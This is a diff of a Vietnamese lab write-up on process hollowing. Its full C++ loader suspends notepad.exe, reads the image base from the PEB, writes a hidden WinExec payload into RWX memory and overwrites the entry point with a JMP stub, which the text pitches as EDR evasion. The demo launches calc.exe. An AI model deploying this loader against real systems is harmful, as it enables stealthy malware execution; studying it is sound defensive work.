@@ -3,44 +3,46 @@
 
 # 📝 [PE 08] Process Hollowing (Active Path Custom)
 
-## 📌 1. Tổng Quan Kỹ Thuật (Overview)
+## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)
 
-**Process Hollowing** (còn gọi là *Inline EntryPoint Patch / Process Replacement*) là một trong những giải thuật né tránh phòng thủ động (Dynamic Evasion) kinh điển và mạnh mẽ nhất.
+**Process Hollowing** (còn được gọi dưới các thuật ngữ học thuật như *Inline EntryPoint Patching* hoặc *Process Replacement*) đại diện cho một trong những giải thuật né tránh phòng thủ động (Dynamic Evasion) kinh điển và mạnh mẽ nhất trong không gian bộ nhớ ảo.
 
-Thay vì cố gắng tiêm mã máy vào một tiến trình đang hoạt động bình thường (hành vi dễ bị các bộ quét RAM động phát hiện do sinh luồng lạ), kỹ thuật này chọn cách **"mượn xác hoàn hồn"**: Khởi tạo một tiến trình vỏ bọc hoàn toàn hợp pháp và sạch từ hệ thống (ví dụ: `notepad.exe`) ở trạng thái đóng băng, sau đó can thiệp cấu trúc PE Header để vá mìn điều hướng ngay tại điểm xuất phát **`EntryPoint`** gốc. Khi rã đông, tiến trình sẽ tự động thực thi mã máy của ta dưới lớp mặt nạ của một danh tính đáng tin cậy.
+Thay vì thực hiện hành vi tiêm nhiễm mã máy vào một tiến trình đang vận hành bình thường (một chỉ dấu hành vi vô cùng nhạy cảm dễ dàng bị các cảm biến quét RAM động của EDR tóm gáy do sinh luồng lạ), kỹ thuật này lựa chọn giải pháp **"Mượn xác hoàn hồn" (Process Masquerading)**. Loader chủ động khởi tạo một tiến trình vỏ bọc hoàn toàn hợp pháp và có độ tin cậy cao từ hệ thống (ví dụ: `notepad.exe`) dưới trạng thái đóng băng sơ khởi. Sau đó, cấu trúc PE Header từ xa sẽ bị can thiệp giải phẫu để vá mìn điều hướng ngay tại vạch xuất phát **`EntryPoint`** gốc. Khi luồng thực thi được giải phóng, tiến trình vỏ bọc sẽ tự động kích nổ mã máy của Loader dưới lớp mặt nạ của một danh tính pháp nhân đáng tin cậy.
 
 ### 🎯 Mục tiêu nghiên cứu:
 
-* Làm chủ kỹ thuật điều khiển vòng đời tiến trình qua trạng thái đóng băng (`CREATE_SUSPENDED`).
-* Giải phẫu cấu trúc ngữ cảnh thanh ghi CPU x64 (`CONTEXT`) và định vị PE Header từ xa.
-* Triệt tiêu hoàn toàn chuỗi gán cứng đường dẫn hệ thống bằng giải thuật tự động tra cứu động (Active Path Custom).
+* **Kiểm soát vòng đời tiến trình đóng băng**: Điều khiển và thao túng cấu trúc luồng hệ thống thông qua trạng thái sơ khởi `CREATE_SUSPENDED`.
+* **Giải phẫu Ngữ cảnh CPU x64 (`CONTEXT`)**: Tiếp cận cấu trúc thanh ghi phần cứng ở không gian người dùng và định vị bản đồ PEB từ xa.
+* **Tự động hóa tra cứu bản đồ hệ thống**: Triệt tiêu hoàn toàn chuỗi gán cứng đường dẫn hệ thống bằng giải thuật tự động tra cứu động (Active Path Custom), bảo đảm khả năng tương thích thích ứng kịch trần.
 
 ---
 
-## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)
+## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)
 
-Khi một tiến trình được sinh ra với cờ `CREATE_SUSPENDED`, Windows Kernel sẽ khởi tạo không gian địa chỉ ảo, nạp các tệp DLL cơ bản, dựng cấu trúc PEB (Process Environment Block) và luồng chính (Main Thread), nhưng **đóng băng luồng ngay tại vạch xuất phát hệ thống** (trước khi CPU kịp chạm vào điểm EntryPoint của file thực thi).
+Khi một tiến trình được sinh ra với cờ cấu hình `CREATE_SUSPENDED`, Windows Kernel sẽ hoàn tất việc thiết lập không gian địa chỉ ảo, nạp các thư viện Subsystem cơ bản (`ntdll.dll`), dựng cấu trúc PEB (Process Environment Block) cùng luồng thực thi chính (Main Thread), nhưng **đóng băng luồng ngay tại vạch xuất phát hệ thống** (trước khi con trỏ lệnh của CPU kịp chạm vào điểm EntryPoint của file nhị phân).
 
-Quy trình toán học giải phẫu và điều hướng của Lab PE 08 diễn ra qua các bước ngầm sau:
-
-```
-[CreateProcessW: Đóng băng] ──> [GetThreadContext: Đọc thanh ghi] ──> [Đọc PEB -> Định vị EntryPoint] ──> [Vá JMP Stub x64] ──> [ResumeThread: Khai hỏa]
+Quy trình toán học giải phẫu và vá mìn điều hướng của Lab PE 08 diễn ra qua 4 giai đoạn ngầm tại bộ nhớ ảo:
 
 ```
+[CreateProcessW: Đóng băng tiến trình]
+       └──> [GetThreadContext: Trích xuất trạng thái thanh ghi]
+                 └──> [Đọc PEB -> Bóc tách ImageBaseAddress -> Định vị EntryPoint]
+                           └──> [Vá Inline JMP Stub x64 -> ResumeThread kích nổ]
 
-1. **Trích xuất Base Address qua PEB**: Trên kiến trúc x64, khi một luồng bị đóng băng sơ khởi, thanh ghi **`Rdx`** của CPU sẽ lưu giữ địa chỉ của cấu trúc **PEB**. Bằng cách đọc ô nhớ ảo từ xa tại tọa độ `Rdx + 0x10`, Loader sẽ bốc chính xác địa chỉ gốc `ImageBaseAddress` thực tế của tiến trình vỏ bọc trên RAM.
-2. **Giải phẫu PE Header định vị EntryPoint**: Loader đọc $4\text{ KB}$ đầu tiên của `ImageBaseAddress` để phân tích cấu trúc cấu trúc DOS và NT Headers. Toạ độ tuyệt đối của điểm khai hỏa hợp pháp được tính toán bằng công thức:
+```
+
+1. **Trích xuất Base Address thông qua cấu trúc PEB**: Trên kiến trúc Windows x64, tại thời điểm một luồng thực thi bị đóng băng sơ khởi, thanh ghi **`Rdx`** của CPU sẽ chịu trách nhiệm lưu giữ địa chỉ trỏ đến bản ghi cấu trúc **PEB**. Bằng giải thuật đọc ô nhớ ảo từ xa tại tọa độ toán học `Rdx + 0x10`, Loader sẽ bốc tách chính xác địa chỉ gốc `ImageBaseAddress` thực tế của tiến trình vỏ bọc trên RAM mà không bị ảnh hưởng bởi cơ chế ngẫu nhiên hóa ASLR.
+2. **Giải phẫu PE Header định vị tọa độ khai hỏa**: Loader phát lệnh đọc $4\text{ KB}$ phân vùng Headers đầu tiên của `ImageBaseAddress` để phân tích cấu trúc cấu hình DOS và NT Headers từ xa. Tọa độ tuyệt đối của điểm EntryPoint hợp pháp được tính toán kịch khung bằng công thức:
 
 $$\text{RemoteEntryPoint} = \text{ImageBaseAddress} + \text{ntHeaders.OptionalHeader.AddressOfEntryPoint}$$
 
-
-3. **Thiết lập mìn điều hướng (Inline JMP Patch)**: Thay vì unmap toàn bộ module (hành vi bị EDR chặn đứng lập tức trên Windows 11), ta áp dụng kỹ thuật vá mịn Inline tinh vi. Ta lật quyền trang nhớ chứa `EntryPoint` sang `RWX` và ghi đè một đoạn mã máy Assembly x64 (JMP Stub) dài 22-byte để bẻ hướng dòng chảy của CPU đâm thẳng vào phân vùng Payload độc lập vị trí (PIC) của ta.
+3. **Thiết lập cấu trúc mìn điều hướng (Inline JMP Patch)**: Thay vì thực hiện giải pháp Unmap toàn bộ mô-đun (hành vi thô bạo này lập tức bị tiểu chuẩn bảo mật bảo vệ bộ nhớ của Windows 11 và EDR chặn đứng), dự án áp dụng kỹ thuật vá mịn Inline tinh vi. Loader chuyển đổi cờ bảo vệ trang nhớ chứa `EntryPoint` sang `RWX` và ghi đè một đoạn mã máy Assembly x64 (JMP Stub) dài 22-byte nhằm cưỡng bách con trỏ lệnh của CPU đâm thẳng vào phân vùng Payload độc lập vị trí (Position-Independent Code) đã được chuẩn bị sẵn.
 
 ---
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán thư mục hệ thống thực tế bằng `GetSystemDirectoryW` để đạt độ linh hoạt tối đa.
+Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa tính toán và trích xuất đường dẫn thư mục hệ thống thực tế thông qua API `GetSystemDirectoryW` nhằm tối ưu hóa tính phòng thủ.
 
 ```cpp
 #include <windows.h>
@@ -48,7 +50,7 @@ Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – 
 #include <string>
 #include <vector>
 
-// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
+// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
 typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
 typedef struct _THREAD_DATA {
@@ -62,7 +64,7 @@ DWORD WINAPI RemoteHollowedPayload(LPVOID lpParam) {
     if (pData && pData->pWinExec) {
         pData->pWinExec(pData->szCommand, SW_HIDE);
     }
-    // Giữ luồng sống độc lập inside lòng tiến trình vỏ bọc để bảo toàn tính ổn định
+    // Giữ luồng sống độc lập inside lòng tiến trình vỏ bọc để bảo toàn tính ổn định cấu trúc
     while (TRUE) {
         Sleep(1000);
     }
@@ -87,7 +89,7 @@ int main() {
     std::cout << "[*] PE 08: PROCESS HOLLOWING ACTIVE PATH (CALC.EXE)" << std::endl;
     std::cout << "====================================================" << std::endl;
 
-    // CHỦ ĐỘNG: Tự động tra cứu bản đồ thư mục hệ thống thực tế thay vì gán cứng
+    // CHỦ ĐỘNG: Tự động tra cứu bản đồ thư mục hệ thống thực tế thay vì gán cứng chuỗi
     std::wstring targetProcessName = L"notepad.exe";
     std::wstring activeSysPath = GetActiveTargetBuffer(targetProcessName);
     
@@ -105,7 +107,7 @@ int main() {
     std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang..." << std::endl;
     BOOL success = CreateProcessW(NULL, const_cast<LPWSTR>(activeSysPath.c_str()), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     if (!success) {
-        std::cerr << "[-] Failed to create suspended process. Error: " << GetLastError() << std::endl;
+        std::cerr << "[-] Failed to create suspended process. Error Code: " << GetLastError() << std::endl;
         return EXIT_FAILURE;
     }
     std::cout << "[+] Tien trinh vo boc duoc tao voi PID: " << pi.dwProcessId << std::endl;
@@ -116,7 +118,7 @@ int main() {
     GetThreadContext(pi.hThread, &context);
 
     PVOID baseAddress = NULL;
-    // ĐọcImageBaseAddress từ PEB (Thanh ghi Rdx + offset 0x10 trên x64 architecture)
+    // Đọc ImageBaseAddress từ PEB (Thanh ghi Rdx + offset 0x10 trên kiến trúc x64)
     ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &baseAddress, sizeof(PVOID), NULL);
     std::cout << "[+] Toa do Base Address goc cua vo boc: 0x" << std::hex << baseAddress << std::endl;
 
@@ -136,7 +138,7 @@ int main() {
     LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-    // Khởi tạo tham số tuyệt đối cấu trúc
+    // Khởi tạo tham số cấu trúc tuyệt đối
     THREAD_DATA localData;
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     if (hKernel32) {
@@ -151,9 +153,9 @@ int main() {
     DWORD oldProtect = 0;
     if (VirtualProtectEx(pi.hProcess, remoteEntryPoint, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {
         
-        // Mã máy lệnh nhảy tuyệt đối x64 bẻ hướng dòng chảy CPU đâm thẳng vào Payload
+        // Mã máy lệnh nhảy tuyệt đối x64 bẻ hướng dòng chảy CPU đâm thẳng vào phân vùng Payload
         unsigned char jmpStub[] = {
-            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0 (Địa chỉ tham số tuyệt đối)
+            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0 (Địa chỉ tham số cấu trúc tuyệt đối)
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 (Địa chỉ hàm Code)
             0xFF, 0xE0                                                  // jmp rax
         };
@@ -161,7 +163,7 @@ int main() {
         *(DWORD_PTR*)(jmpStub + 2) = (DWORD_PTR)pRemoteData;
         *(DWORD_PTR*)(jmpStub + 12) = (DWORD_PTR)remoteCodeBuffer;
 
-        // Đè bẹp vạch xuất phát gốc bằng mìn điều hướng
+        // Đè bẹp vạch xuất phát gốc bằng mìn điều hướng Assembly
         WriteProcessMemory(pi.hProcess, remoteEntryPoint, jmpStub, sizeof(jmpStub), NULL);
         VirtualProtectEx(pi.hProcess, remoteEntryPoint, 32, oldProtect, &oldProtect);
         std::cout << "[+] Nap va thiet lap JMP Stub be huong tai EntryPoint hop phap hoan tat!" << std::endl;
@@ -175,7 +177,7 @@ int main() {
     std::cout << "[*] Nhan phim Enter de don dep va dong cua so..." << std::endl;
     std::cin.get();
 
-    // Giải phóng Handle hệ thống sạch sẽ
+    // Giải phóng tài nguyên Handle phẳng sạch hệ thống
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     return EXIT_SUCCESS;
@@ -185,19 +187,25 @@ int main() {
 
 ---
 
-## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)
+## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)
 
-### ⚙️ Thiết lập trên Microsoft Visual Studio:
+Để bảo đảm file thực thi Loader vận hành phẳng sạch, hoàn chỉnh và độc lập khi triển khai thực nghiệm trên môi trường máy ảo VM sạch cô lập:
 
-1. Đặt thanh công cụ quản lý cấu hình dự án ở chế độ **`Release`** và nền tảng kiến trúc **`x64`**.
-2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện.
-3. Click chuột phải dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch dấu vết.
+### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:
+
+1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
+2. Di chuyển đến mục thuộc tính: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng cấu hình `Runtime Library`, chuyển thông số sang định dạng cờ **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ mã nguồn CRT.
+
+> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
+> 
+
+3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân hoàn thiện.
 
 ---
 
-## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)
+## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)
 
-Thực thi file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế:
+Khai hỏa file thực thi thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi ma trận can thiệp ngữ cảnh:
 
 ```powershell
 PS C:\Workspace\x64\Release> .\PE08_Process_Hollowing.exe
@@ -209,16 +217,20 @@ PS C:\Workspace\x64\Release> .\PE08_Process_Hollowing.exe
 [+] Tien trinh vo boc duoc tao voi PID: 18128
 [+] Toa do Base Address goc cua vo boc: 0x00007FF746130000
 [+] Toa do EntryPoint hop phap san co cua Notepad: 0x00007FF746292230
-[+] Vung nho Code RWX cua payload dat tai: 0x000001A40CE30000
 [+] Nap va thiet lap JMP Stub be huong tai EntryPoint hop phap hoan tat!
-[*] Kich hoat ra dong (ResumeThread) de luong tu dong kich no APC...
+[*] Kich hoat ra dong (ResumeThread) de luong tu dong kich no...
 
 [+] Process Hollowing (Active Path Custom) Successful!
 [*] Nhan phim Enter de don dep va dong cua so...
 
 ```
 
-*🎯 Hệ quả RAM:* CPU thức dậy từ trạng thái Suspended, tự động dẫm trúng mìn JMP Patch tại EntryPoint của Notepad, kích nổ mở bung Máy tính `calc.exe` hiên ngang rực rỡ kịch trần kịch khung!
+> **Vị trí đặt ảnh minh chứng thực nghiệm can thiệp EntryPoint:**
+> 
+
+### 🎯 Phân tích hệ quả RAM kịch trần:
+
+* Ngay sau khi lệnh `ResumeThread` được phát ra, CPU thức dậy từ trạng thái Suspended, tịnh tiến con trỏ lệnh và lập tức dẫm trúng mìn JMP Patch đã được Loader vá mịn tại tọa độ `EntryPoint` hợp pháp ban đầu của Notepad.
+* Luồng CPU bị điều hướng cưỡng bức, kích nổ mở bung ứng dụng Máy tính **`calc.exe` hiên ngang rực rỡ kịch trần kịch khung** dưới lớp vỏ bọc hoàn hảo của một tiến trình hệ thống, hoàn tất chuỗi bài Lab nâng cao một cách mỹ mãn!
 
 ---
-
